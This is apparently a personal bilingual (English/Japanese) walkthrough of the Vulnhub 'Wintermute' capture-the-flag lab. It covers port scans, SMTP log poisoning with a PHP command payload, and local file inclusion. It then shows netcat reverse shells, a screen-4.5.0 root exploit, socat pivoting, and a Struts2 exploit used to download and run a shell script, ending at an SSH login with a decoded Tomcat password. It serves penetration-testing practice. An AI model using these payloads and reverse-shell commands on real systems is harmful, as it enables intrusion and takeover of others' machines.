**summary**

1 straylight

2 neuromancer

Description

A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer - a must read for any cyber-security enthusiast. This lab makes use of pivoting and post exploitation, which I've found other OSCP prep labs seem to lack. The goal is the get root on both machines. All you need is default Kali Linux.

I'd rate this as Intermediate. No buffer overflows or exploit development - any necessary password cracking can be done with small wordlists. It's much more related to an OSCP box vs a CTF. I've tested it quite a bit, but if you see any issues or need a nudge PM me here.

Virtual Box Lab setup instructions are included in the zip download, but here's a quick brief:

Straylight - simulates a public facing server with 2 NICS. Cap this first, then pivot to the final machine. Neuromancer - is within a non-public network with 1 NIC. Your Kali box should ONLY be on the same virtual network as Straylight.

This works better with VirtualBox rather than Vmware

サイバーパンクの名作「ニューロマンサー」をテーマにした、2台の脆弱なマシンを含む新しいOSCPスタイルのラボは、サイバーセキュリティ愛好家にとって必読です。

このラボでは、ピボットとポストエクスプロイトを利用していますが、他のOSCP準備ラボには欠けているようです。目標は、両方のマシンでルートを取得することです。必要なのはデフォルトのKaliLinuxだけです。

私はこれを中級と評価します。バッファオーバーフローやエクスプロイト開発はありません - 必要なパスワードクラッキングは小さな単語リストで行うことができます。これは、OSCPボックスとCTFにはるかに関連しています。私はそれをかなりテストしましたが、問題が発生した場合、またはナッジが必要な場合は、ここで私をPMしてください。

Virtual Box Labのセットアップ手順はzipダウンロードに含まれていますが、ここでは簡単に説明します。

Straylight - 2 つの NIC を持つ公開サーバーをシミュレートします。最初にこれに上限を付け、次に最後のマシンにピボットします。

ニューロマンサー - NIC が 1 つの非パブリック ネットワーク内にあります。

Kali ボックスは、Straylight と同じ仮想ネットワーク上にのみ配置する必要があります。

これは、VMwareよりもVirtualBoxの方がうまく機能します。

**1.1 Service Enumeration**

サービス列挙

└─# nmap -p- -A -T4 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 09:00 JST

Nmap scan report for 192.168.56.103

Host is up (0.00077s latency).

Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE            VERSION

25/tcp   open  smtp               Postfix smtpd

\|_ssl-date: TLS randomness does not represent time

\|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8

\| ssl-cert: Subject: commonName=straylight

\| Subject Alternative Name: DNS:straylight

\| Not valid before: 2018-05-12T18:08:02

\|_Not valid after:  2028-05-09T18:08:02

80/tcp   open  http               Apache httpd 2.4.25 ((Debian))

\|_http-title: Night City

\|_http-server-header: Apache/2.4.25 (Debian)

3000/tcp open  hadoop-tasktracker Apache Hadoop

\| hadoop-datanode-info:

\|_  Logs: submit

\|_http-trane-info: Problem with XML parsing of /evox/about

\| http-title: Welcome to ntopng

\|_Requested resource was /lua/login.lua?referer=/

\| hadoop-tasktracker-info:

\|_  Logs: submit

MAC Address: 08:00:27:EB:D8:07 (Oracle VirtualBox virtual NIC)

Device type: general purpose

Running: Linux 3.X|4.X

OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4

OS details: Linux 3.2 - 4.9

Network Distance: 1 hop

Service Info: Host:  straylight

TRACEROUTE

HOP RTT     ADDRESS

1   0.77 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 24.64 seconds

![[Wintermute image.png]]

└─# nmap -sVC 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 08:57 JST

Nmap scan report for 192.168.56.103

Host is up (0.00047s latency).

Not shown: 997 closed tcp ports (reset)

PORT     STATE SERVICE            VERSION

25/tcp   open  smtp               Postfix smtpd

\| ssl-cert: Subject: commonName=straylight

\| Subject Alternative Name: DNS:straylight

\| Not valid before: 2018-05-12T18:08:02

\|_Not valid after:  2028-05-09T18:08:02

\|_ssl-date: TLS randomness does not represent time

\|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8

80/tcp   open  http               Apache httpd 2.4.25 ((Debian))

\|_http-title: Night City

\|_http-server-header: Apache/2.4.25 (Debian)

3000/tcp open  hadoop-tasktracker Apache Hadoop

\| http-title: Welcome to ntopng

\|_Requested resource was /lua/login.lua?referer=/

\| hadoop-datanode-info:

\|_  Logs: submit

\|_http-trane-info: Problem with XML parsing of /evox/about

\| hadoop-tasktracker-info:

\|_  Logs: submit

MAC Address: 08:00:27:EB:D8:07 (Oracle VirtualBox virtual NIC)

Service Info: Host:  straylight

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 19.16 seconds

![[Wintermute image 1.png]]

└─# gobuster dir -u http://192.168.56.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:                     http://192.168.56.103

\[+\] Method:                  GET

\[+\] Threads:                 10

\[+\] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

\[+\] Negative Status codes:   404

\[+\] User Agent:              gobuster/3.6

\[+\] Timeout:                 10s

\===============================================================

Starting gobuster in directory enumeration mode

\===============================================================

/manual               (Status: 301) \[Size: 317\] \[--> http://192.168.56.103/manual/\]

/freeside             (Status: 301) \[Size: 319\] \[--> http://192.168.56.103/freeside/\]

Progress: 87664 / 87665 (100.00%)

\===============================================================

Finished

\===============================================================

![[Wintermute image 2.png]]

**1.2 Initial Access –**

ブラウザアクセス

http://192.168.56.103/

![[Wintermute image 3.png]]

http://192.168.56.103/freeside/

![[Wintermute image 4.png]]

とくになし

http://192.168.56.103:3000/

![[Wintermute image 5.png]]

Hint: the default user and password are admin

ヒントにあるdefault userでログイン

![[Wintermute image 6.png]]

成功

ログインするとgobusterでは出てこなかったディレクトリがある

/turing-bolo/

http://192.168.56.103/turing-bolo/

![[Wintermute image 7.png]]

![[Wintermute image 8.png]]

Caseを選択して送信

![[Wintermute image 9.png]]

複数のlogファイルが表示されているのでディレクトリトラバーサルの可能性を確認

いろいろ検証した結果25番ポートが開いていたことからメールのログを試行

![[Wintermute image 10.png]]

成功

メールサーバに対してポイズニングします

└─# telnet 192.168.56.103 25

Trying 192.168.56.103...

Connected to 192.168.56.103.

Escape character is '^\]'.

220 straylight ESMTP Postfix (Debian/GNU)

MAIL FROM:\<test@atk.com>

250 2.1.0 Ok

RCPT TO:\<?php echo system($_POST\['cmd'\]); ?>

501 5.1.3 Bad recipient address syntax

![[Wintermute image 11.png]]

└─# curl -X POST http://192.168.56.103/turing-bolo/bolo.php?bolo=/var/log/mail --data "cmd=ls"

bolo.css

bolo.php

c7.png

case.log

css

index.html

molly.log

riviera.log

ta.png

ta.png

\</body>

\</html>

![[Wintermute image 12.png]]

![[Wintermute image 13.png]]

リバースシェル

kali側で待受け

└─# nc -nlvp 4444

listening on \[any\] 4444 ...

![[Wintermute image 14.png]]

リバースシェルの実行

└─# curl -X POST http://192.168.56.103/turing-bolo/bolo.php?bolo=/var/log/mail --data "cmd=nc -e /bin/sh 192.168.56.106 4444"

![[Wintermute image 15.png]]

![[Wintermute image 16.png]]

成功

**1.3 Privilege Escalation -**

TTYシェル

www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 -type f 2>/dev/null

\<turing-bolo$ find / -perm -4000 -type f 2>/dev/null

/bin/su

/bin/umount

/bin/mount

/bin/screen-4.5.0

/bin/ping

/usr/bin/gpasswd

/usr/bin/chsh

/usr/bin/chfn

/usr/bin/passwd

/usr/bin/newgrp

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/eject/dmcrypt-get-device

/usr/lib/openssh/ssh-keysign

![[Wintermute image 17.png]]

screen-4.5.0

![[Wintermute image 18.png]]

ダウンロード

kali上でwebサーバーをたててファイルをダウンロードできるように待受けておく

└─# python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

![[Wintermute image 19.png]]

www-data@straylight:/tmp$ chmod 777 41154.sh

chmod 777 41154.sh

www-data@straylight:/tmp$ ./41154.sh

./41154.sh

~ gnu/screenroot ~

\[+\] First, we create our shell and library...

/tmp/libhax.c: In function 'dropshell':

/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' \[-Wimplicit-function-declaration\]

chmod("/tmp/rootshell", 04755);

^~~~~

/tmp/rootshell.c: In function 'main':

/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' \[-Wimplicit-function-declaration\]

setuid(0);

^~~~~~

/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' \[-Wimplicit-function-declaration\]

setgid(0);

^~~~~~

/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' \[-Wimplicit-function-declaration\]

seteuid(0);

^~~~~~~

/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' \[-Wimplicit-function-declaration\]

setegid(0);

^~~~~~~

/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' \[-Wimplicit-function-declaration\]

execvp("/bin/sh", NULL, NULL);

^~~~~~

\[+\] Now we create our /etc/ld.so.preload file...

\[+\] Triggering...

' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.

\[+\] done!

No Sockets found in /tmp/screens/S-www-data.

\# id

id

uid=0(root) gid=0(root) groups=0(root),33(www-data)

![[Wintermute image 20.png]]

**1.4 Post Exploitation**

\# cd /root

cd /root

\# ls

ls

flag.txt  note.txt  scripts

\# cat flag.txt

cat flag.txt

5ed185fd75a8d6a7056c96a436c6d8aa

\# cat note.txt

cat note.txt

Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh

Turing Systems Engineer II

Freeside//Straylight//Ops5

![[Wintermute image 21.png]]

1.5 Exploitation

nmapが使えないため、スクリプトでホストスキャン

root@straylight:/etc# for ip in $(seq 101 105); do ping -c 1 192.168.56.$ip; done

\<n $(seq 101 105); do ping -c 1 192.168.56.$ip; done

PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.

64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.669 ms

--- 192.168.56.101 ping statistics ---

1 packets transmitted, ==🟡1 received==, 0% packet loss, time 0ms

rtt min/avg/max/mdev = 0.669/0.669/0.669/0.000 ms

PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.

From 192.168.56.103 icmp_seq=1 Destination Host Unreachable

--- 192.168.56.102 ping statistics ---

1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms

PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.

64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.011 ms

--- 192.168.56.103 ping statistics ---

1 packets transmitted, 1 received, 0% packet loss, time 0ms

rtt min/avg/max/mdev = 0.011/0.011/0.011/0.000 ms

PING 192.168.56.104 (192.168.56.104) 56(84) bytes of data.

64 bytes from 192.168.56.104: icmp_seq=1 ttl=64 time=0.026 ms

--- 192.168.56.104 ping statistics ---

1 packets transmitted, 1 received, 0% packet loss, time 0ms

rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms

PING 192.168.56.105 (192.168.56.105) 56(84) bytes of data.

From 192.168.56.103 icmp_seq=1 Destination Host Unreachable

--- 192.168.56.105 ping statistics ---

1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms

![[Wintermute image 22.png]]

ポートスキャン

root@straylight:/etc# for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.101 $i 2>&1; done | grep -v "Connection refused"

\<56.101 $i 2>&1; done | grep -v "Connection refused"

(UNKNOWN) \[192.168.56.101\] 8009 (?) open

(UNKNOWN) \[192.168.56.101\] 8080 (http-alt) open

(UNKNOWN) \[192.168.56.101\] 34483 (?) open

![[Wintermute image 23.png]]

- ポートフォワーディング

socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.101:8009 &

socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.101:8080 &

socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.101:34483 &

root@straylight:/etc# socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.101:8009 &

\<ISTEN:8009,fork,reuseaddr tcp:192.168.56.101:8009 &

\[1\] 26102

root@straylight:/etc# socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.101:8080 &

\<ISTEN:8000,fork,reuseaddr tcp:192.168.56.101:8080 &

\[2\] 26121

root@straylight:/etc# socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.101:34483 &

\<TEN:34483,fork,reuseaddr tcp:192.168.56.101:34483 &

\[3\] 26140

![[Wintermute image 24.png]]

ポートフォワーディングテスト

kali(192.168.56.106) → straylighi(192.168.56.103) → newromancer(192.168.56.101)

└─# nmap -p 8009,8000,34483 -T5 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 20:21 JST

Nmap scan report for 192.168.56.103

Host is up (0.00044s latency).

PORT      STATE SERVICE

8000/tcp  open  http-alt

8009/tcp  open  ajp13

34483/tcp open  unknown

MAC Address: 08:00:27:3C:5B:FE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds

![[Wintermute image 25.png]]

2.1 Service Enumeration

8000(8080)

└─# nmap -Pn -sVC -p8000 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 12:14 JST

Nmap scan report for 192.168.56.103

Host is up (0.00081s latency).

PORT     STATE SERVICE VERSION

8000/tcp open  http    Apache Tomcat 9.0.0.M26

\|_http-favicon: Apache Tomcat

\|_http-title: Apache Tomcat/9.0.0.M26

MAC Address: 08:00:27:EB:D8:07 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds

![[Wintermute image 26.png]]

http

8009

└─# nmap -Pn -sVC -p8009 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 12:20 JST

Nmap scan report for 192.168.56.103

Host is up (0.00087s latency).

PORT     STATE SERVICE VERSION

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)

\|_ajp-methods: Failed to get a valid response for the OPTION request

MAC Address: 08:00:27:EB:D8:07 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 17.52 seconds

![[Wintermute image 27.png]]

└─# nmap -Pn -sVC -p34483 192.168.56.103

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 12:23 JST

Nmap scan report for 192.168.56.103

Host is up (0.00085s latency).

PORT      STATE SERVICE VERSION

34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\|   2048 2e:9b:4a:a9:c0:fc:0b:d8:ef:f1:e3:9d:f4:59:25:32 (RSA)

\|   256 f6:2a:de:07:36:36:00:e9:b5:5d:2f:aa:03:79:91:d1 (ECDSA)

\|_  256 38:3c:a8:ed:91:ea:ce:1d:0d:0f:ab:51:ac:97:c8:fb (ED25519)

MAC Address: 08:00:27:EB:D8:07 (Oracle VirtualBox virtual NIC)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds

![[Wintermute image 28.png]]

ssh

2.2 Initial Access

http://192.168.56.103:8000/

![[Wintermute image 29.png]]

http://192.168.56.103:8000/struts2_2.3.15.1-showcase/showcase.action

![[Wintermute image 30.png]]

└─# searchsploit struts

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Exploit Title                                                                                                                                                                                            |  Path

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Apache Struts - 'ParametersInterceptor' Remote Code Execution (Metasploit)                                                                                                                                | multiple/remote/24874.rb

Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                                                                                               | multiple/remote/33142.rb

Apache Struts - Developer Mode OGNL Execution (Metasploit)                                                                                                                                                | java/remote/31434.rb

Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                                                                                                                              | linux/remote/39756.rb

Apache Struts - includeParams Remote Code Execution (Metasploit)                                                                                                                                          | multiple/remote/25980.rb

Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                                                  | multiple/webapps/18452.txt

Apache Struts - OGNL Expression Injection                                                                                                                                                                 | multiple/remote/38549.txt

Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                                                                                                                          | multiple/remote/43382.py

Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)                                                                                                             | multiple/remote/39919.rb

Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                                                                                                                                 | multiple/remote/26542.txt

Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution                                                                                                                                        | java/webapps/48917.py

Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                                                                                           | multiple/remote/27135.rb

Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                                                                                                                          | multiple/remote/45367.rb

Apache Struts 2 - Skill Name Remote Code Execution                                                                                                                                                        | multiple/remote/37647.txt

Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                                                                                                                               | multiple/remote/44643.rb

Apache Struts 2 \< 2.3.1 - Multiple Vulnerabilities                                                                                                                                                        | multiple/webapps/18329.txt

Apache Struts 2.0 - 'XSLTResult.java' Arbitrary File Upload                                                                                                                                               | java/webapps/37009.xml

Apache Struts 2.0.0 \< 2.2.1.1 - XWork 's:submit' HTML Tag Cross-Site Scripting                                                                                                                            | multiple/remote/35735.txt

Apache Struts 2.0.1 \< 2.3.33 / 2.5 \< 2.5.10 - Arbitrary Code Execution                                                                                                                                    | multiple/remote/44556.py

Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                                                                                                                             | multiple/remote/36426.txt

Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                                                                                                                             | multiple/remote/18984.rb

Apache Struts 2.2.3 - Multiple Open Redirections                                                                                                                                                          | multiple/remote/38666.txt

Apache Struts 2.3 \< 2.3.34 / 2.5 \< 2.5.16 - Remote Code Execution (1)                                                                                                                                     | linux/remote/45260.py

Apache Struts 2.3 \< 2.3.34 / 2.5 \< 2.5.16 - Remote Code Execution (2)                                                                                                                                     | multiple/remote/45262.py

Apache Struts 2.3.5 \< 2.3.31 / 2.5 \< 2.5.10 - 'Jakarta' Multipart Parser OGNL Injection (Metasploit)                                                                                                      | multiple/remote/41614.rb

Apache Struts 2.3.5 \< 2.3.31 / 2.5 \< 2.5.10 - Remote Code Execution                                                                                                                                       | linux/webapps/41570.py

==🟡Apache Struts 2.3.x Showcase - Remote Code Execution                                                                                                                                                      | multiple/webapps/42324.py==

Apache Struts 2.5 \< 2.5.12 - REST Plugin XStream Remote Code Execution                                                                                                                                    | linux/remote/42627.py

Apache Struts 2.5.20 - Double OGNL evaluation                                                                                                                                                             | multiple/remote/49068.py

Apache Struts \< 1.3.10 / \< 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                                                                         | multiple/remote/41690.rb

Apache Struts \< 2.2.0 - Remote Command Execution (Metasploit)                                                                                                                                             | multiple/remote/17691.rb

Apache Struts2 2.0.0 \< 2.3.15 - Prefixed Parameters OGNL Injection                                                                                                                                        | multiple/webapps/44583.txt

Struts 2.0.11 - Multiple Directory Traversal Vulnerabilities                                                                                                                                              | multiple/remote/32565.txt

Struts2/XWork \< 2.2.0 - Remote Command Execution                                                                                                                                                          | multiple/remote/14360.txt

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results

![[Wintermute image 31.png]]

Apache Struts 2.3.x Showcase - Remote Code Execution                                                                                                                                                      | multiple/webapps/42324.py

見つかったスクリプトをコピー

└─# cp /usr/share/exploitdb/exploits/multiple/webapps/42324.py ./

![[Wintermute image 32.png]]

リバースシェル用のスクリプト用のsocatを新たにstraylightに設置

socat TCP-LISTEN:6666,fork,reuseaddr tcp:192.168.56.106:6666 &

root@straylight:/etc# socat TCP-LISTEN:6666,fork,reuseaddr tcp:192.168.56.106:6666 &

\<ISTEN:6666,fork,reuseaddr tcp:192.168.56.106:6666 &

\[4\] 25982

![[Wintermute image 33.png]]

Kaliでリスナーを設定する

└─# nc -nlvp 6666

listening on \[any\] 6666 ...

![[Wintermute image 34.png]]

integration/saveGangster.action "nc -nv 192.168.56.103 6666"

└─# python 42324.py http://192.168.56.103:8000/struts2_2.3.15.1-showcase/integration/saveGangster.action "nc -nv 192.168.56.103 6666"

\[*\] exploit Apache Struts2 S2-048

\[+\] command: nc -nv 192.168.56.103 6666

python 42324.py http://192.168.56.103:8000/2.3.15.1-showcase/integration/saveGangster.action "ncat -e /bin/bash 192.168.56.103 6666"

うまくいかなかったので別の方法

Webサーバ構築用のsocatを設定

socat TCP-LISTEN:1234,fork,reuseaddr TCP:192.168.56.106:1234 &

root@straylight:/etc# socat TCP-LISTEN:1234,fork,reuseaddr TCP:192.168.56.106:1234 &

\<ISTEN:1234,fork,reuseaddr TCP:192.168.56.106:1234 &

\[5\] 683

![[Wintermute image 35.png]]

reverse.shを作成

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.103 6666 >/tmp/f

python 42324.py http://192.168.56.103:8000/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget http://192.168.56.103:1234/revbash.sh -O /tmp/revbash.sh"

貼り付け元  \<https://jckhmr.net/wintermute-part-2-neuromancer-vulnhub-writeup/>

![[Wintermute image 36.png]]

└─$ python3 -m http.server 1234

Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...

192.168.56.103 - - \[10/Mar/2024 18:43:23\] "GET /revbash.sh HTTP/1.1" 200 -

![[Wintermute image 37.png]]

実行権の付与

python 42324.py http://192.168.56.103:8000/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/revbash.sh"

実行

└─# python 42324.py http://192.168.56.103:8000/struts2_2.3.15.1-showcase/integration/saveGangster.action "sh /tmp/revbash.sh"

\[*\] exploit Apache Struts2 S2-048

\[+\] command: sh /tmp/revbash.sh

![[Wintermute image 38.png]]

└─# nc -nlvp 6666

listening on \[any\] 6666 ...

connect to \[192.168.56.106\] from (UNKNOWN) \[192.168.56.103\] 43414

/bin/sh: 0: can't access tty; job control turned off

$ id

uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

![[Wintermute image 39.png]]

tomcatユーザ情報を取得

$ locate tomcat-users.xml

/usr/local/tomcat/conf/tomcat-users.xml

$ cat /usr/local/tomcat/conf/tomcat-users.xml

\<?xml version="1.0" encoding="UTF-8"?>

\<tomcat-users xmlns="http://tomcat.apache.org/xml"

xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"

version="1.0">

\<!--

Eng.,

Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.

Is this what Bob keeps talking about, "Security by obscurity?"

Ed Occam//Sys.Engineer I//Night City

"Harry, I took care of it" - Llyod Christmas

-->

\<role rolename="manager-gui"/>

\<user username="==🟡Lady3Jane==" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>

\<!--

\<role rolename="role1"/>

\<user username="tomcat" password="\<must-be-changed>" roles="tomcat"/>

\<user username="both" password="\<must-be-changed>" roles="tomcat,role1"/>

\<user username="role1" password="\<must-be-changed>" roles="role1"/>

-->

\</tomcat-users>

![[Wintermute image 40.png]]

**ユーザ**

**パスワード**

**html****デコード**

![[Wintermute image 41.png]]

\>!Xx3JanexX!\<

ssh接続

└─# ssh -p 34483 lady3jane@192.168.56.103

The authenticity of host '\[192.168.56.103\]:34483 (\[192.168.56.103\]:34483)' can't be established.

ED25519 key fingerprint is SHA256:ijfTJM2eV6oKaqzHfTlX+MEbBdbGrUXUvdwC28EJZBg.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes

Warning: Permanently added '\[192.168.56.103\]:34483' (ED25519) to the list of known hosts.

\----------------------------------------------------------------

\|                Neuromancer Secure Remote Access                |

\| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |

\----------------------------------------------------------------

lady3jane@192.168.56.103's password:

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

\* Documentation:  https://help.ubuntu.com

\* Management:     https://landscape.canonical.com

\* Support:        https://ubuntu.com/advantage

94 packages can be updated.

44 updates are security updates.

lady3jane@neuromancer:~$

![[Wintermute image 42.png]]

成功